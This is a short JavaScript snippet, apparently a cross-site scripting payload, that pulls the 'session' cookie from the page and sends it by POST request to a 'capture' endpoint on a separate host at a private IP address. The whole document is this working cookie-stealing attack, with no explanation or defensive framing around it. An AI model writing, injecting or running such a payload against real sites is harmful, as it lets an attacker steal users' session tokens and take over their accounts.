var xhr = new XMLHttpRequest();
var token = document.cookie.split(';').find(cookie => cookie.trim().startsWith('session=')).split('=')[1];
xhr.open('POST', 'http://192.168.0.102:8000/capture', true);
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.send('token=' + encodeURIComponent(token));
